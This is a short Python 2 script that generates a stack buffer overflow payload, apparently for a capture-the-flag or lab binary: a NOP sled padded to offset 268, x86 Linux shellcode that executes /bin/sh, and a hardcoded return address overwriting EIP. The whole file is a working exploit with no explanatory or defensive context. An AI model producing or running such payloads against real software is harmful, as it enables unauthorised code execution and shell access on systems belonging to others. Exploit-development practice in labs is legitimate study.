#!/usr/bin/python2

offset = 268

shellcode  = b""
shellcode += b"\x6a\x0b\x58\x99\x52\x68\x2f"
shellcode += b"\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += b"\x6e\x89\xe3\x31\xc9\xcd\x80"

junk = b"\x90" * (offset - len(shellcode))

eip = b"\x80\xd6\xff\xff"

print(junk + shellcode + eip)
